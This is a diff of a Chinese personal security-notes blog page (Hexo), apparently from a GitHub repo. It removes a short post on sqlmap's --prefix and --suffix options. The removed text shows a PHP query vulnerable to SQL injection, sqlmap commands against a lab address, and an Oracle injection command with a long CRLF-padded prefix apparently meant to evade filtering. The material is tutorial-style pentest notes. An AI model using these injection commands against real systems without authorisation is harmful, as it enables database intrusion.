@@ -3,23 +3,19 @@
 <head>
     <meta charset="utf-8">
     
-    <title>sqlmap –prefix,–suffix | 个人笔记</title>
+    <title>Category: web前端 | 个人笔记</title>
     
     
-        <meta name="keywords" content="sqlmap –prefix,–suffix">
+        <meta name="keywords" content="个人笔记">
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="^.^不忘初心，方得始终。 sqlmap –prefix,–suffix12345678例如，代码中是这样调用数据库的：$query = &quot;SELECT * FROM users WHERE id=(’&quot; . $_GET[’id’] . &quot;’) LIMIT 0, 1&quot;; 这时你就需要–prefix和–suffix参数了：python sqlmap.py -u &quot;http://192.168.136">
-<meta property="og:type" content="article">
-<meta property="og:title" content="sqlmap –prefix,–suffix">
-<meta property="og:url" content="https://github.com/p1gz/p1gz.github.io/tree/master/undefined/sqlmap –prefix,–suffix/index.html">
+    <meta property="og:type" content="website">
+<meta property="og:title" content="个人笔记">
+<meta property="og:url" content="https://github.com/p1gz/p1gz.github.io/tree/master/categories/web前端/index.html">
 <meta property="og:site_name" content="个人笔记">
-<meta property="og:description" content="^.^不忘初心，方得始终。 sqlmap –prefix,–suffix12345678例如，代码中是这样调用数据库的：$query = &quot;SELECT * FROM users WHERE id=(’&quot; . $_GET[’id’] . &quot;’) LIMIT 0, 1&quot;; 这时你就需要–prefix和–suffix参数了：python sqlmap.py -u &quot;http://192.168.136">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-12-06T11:48:52.590Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sqlmap –prefix,–suffix">
-<meta name="twitter:description" content="^.^不忘初心，方得始终。 sqlmap –prefix,–suffix12345678例如，代码中是这样调用数据库的：$query = &quot;SELECT * FROM users WHERE id=(’&quot; . $_GET[’id’] . &quot;’) LIMIT 0, 1&quot;; 这时你就需要–prefix和–suffix参数了：python sqlmap.py -u &quot;http://192.168.136">
+<meta name="twitter:title" content="个人笔记">
     
 
     
@@ -160,13 +156,13 @@
         
         
          <ul class="unstyled" id="tree" style="display: block;"> 
-                    <li class="directory open">
+                    <li class="directory">
                         <a href="#" data-role="directory">
                             <i class="fa fa-folder-open"></i>
                             &nbsp;
                             sqlmap
                         </a>
-                         <ul class="unstyled" id="tree" style="display: block;">  <li class="file"><a href="/undefined/sqlmap常用参数/">sqlmap常用参数</a></li>  <li class="file"><a href="/undefined/sqlmap绕过脚本/">sqlmap绕过脚本</a></li>  <li class="file active"><a href="/undefined/sqlmap –prefix,–suffix/">sqlmap –prefix,–suffix</a></li>  </ul> 
+                         <ul class="unstyled" id="tree" style="display: block;">  <li class="file"><a href="/undefined/sqlmap常用参数/">sqlmap常用参数</a></li>  <li class="file"><a href="/undefined/sqlmap绕过脚本/">sqlmap绕过脚本</a></li>  <li class="file"><a href="/undefined/sqlmap –prefix,–suffix/">sqlmap –prefix,–suffix</a></li>  </ul> 
                     </li> 
                     
                     <li class="directory">
@@ -268,98 +264,45 @@
     <div id="toTop" class="fa fa-angle-up"></div>
 </aside>
             
-            <section id="main"><article id="post-sqlmap –prefix,–suffix" class="article article-type-post" itemscope="" itemprop="blogPost">
-    <div class="article-inner">
-        
-        
-            <header class="article-header">
-                
-                    <div class="article-meta">
-                        
-    <div class="article-category">
-    	<i class="fa fa-folder"></i>
-        <a class="article-category-link" href="/categories/sqlmap/">sqlmap</a>
+            <section id="main">
+<div class="timeline timeline-wrap">
+    <div class="timeline-row timeline-row-major">
+        <span class="node"><i class="fa fa-folder"></i></span>
+        <h1 class="title">web前端</h1>
     </div>
-
-                        
-                        
-    <div class="article-date">
-        <i class="fa fa-calendar"></i>
-        <a href="/undefined/sqlmap –prefix,–suffix/">
-            <time datetime="2019-12-06T11:40:54.636Z" itemprop="datePublished">2019-12-06</time>
-        </a>
-    </div>
-
-
-                        
-                            <i class="fa fa-bar-chart"></i>
-                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
-                        
-                        
-                    </div>
-                
+    
+        <div class="timeline-row">
+            <span class="node"></span>
+            <div class="content">
                 
     
-        <h1 class="article-title" itemprop="name">
-            sqlmap –prefix,–suffix
+        <h1 itemprop="name">
+            <a class="timeline-article-title" href="/undefined/JS加密批量生成用户名/">JS加密批量生成用户名</a>
         </h1>
     
 
-            </header>
-        
-        
-        <div class="article-entry" itemprop="articleBody">
-        
-        
-            
-        
-        
-            <p>^.^不忘初心，方得始终。</p>
-<h2 id="sqlmap-–prefix-–suffix"><a href="#sqlmap-–prefix-–suffix" class="headerlink" title="sqlmap –prefix,–suffix"></a>sqlmap –prefix,–suffix</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">例如，代码中是这样调用数据库的：</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">"SELECT * FROM users WHERE id=(’"</span> . <span class="variable">$_GET</span>[’id’] . <span class="string">"’) LIMIT 0, 1"</span>; </span><br><span class="line">这时你就需要–prefix和–suffix参数了：</span><br><span class="line">python sqlmap.py -u <span class="string">"http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1"</span> -p id --prefix <span class="string">"’)"</span> --suffix <span class="string">"AND (’abc’=’abc"</span></span><br><span class="line">这样执行的SQL语句变成：</span><br><span class="line"><span class="variable">$query</span> = <span class="string">"SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND (’abc’=’abc’) LIMIT 0, 1"</span>;</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">例子：</span><br><span class="line">sqlmap.py -r C:\Users\samny\Desktop\22.txt  --dbms oracle -p formids --prefix <span class="string">")))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d"</span> --suffix <span class="string">"order by (((1"</span></span><br></pre></td></tr></table></figure>
-
-            </div>
-        
-        <footer class="article-footer">
-        </footer>
+                <div class="article-meta">
+                    
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/undefined/JS加密批量生成用户名/">
+            <time datetime="2019-12-06T11:55:03.028Z" itemprop="datePublished">2019-12-06</time>
+        </a>
     </div>
-</article>
 
 
-    
-<nav id="article-nav">
-    
-        <a href="/undefined/JS加密批量生成用户名/" id="article-nav-newer" class="article-nav-link-wrap">
-            <strong class="article-nav-caption">Newer</strong>
-            <div class="article-nav-title">
-                
-                    JS加密批量生成用户名
-                
+                    
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/web前端/">web前端</a>
+    </div>
+
+                    
+                </div>
             </div>
-        </a>
+        </div>
     
-    
-        <a href="/undefined/sqlmap绕过脚本/" id="article-nav-older" class="article-nav-link-wrap">
-            <strong class="article-nav-caption">Older</strong>
-            <div class="article-nav-title">sqlmap绕过脚本</div>
-        </a>
-    
-</nav>
-
-
-
-
-
-    
-    
-
-
-
-
-<!-- baidu url auto push script -->
-<script type="text/javascript">
-    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
-</script>     
+</div>
 </section>
         </div>
         <footer id="footer">
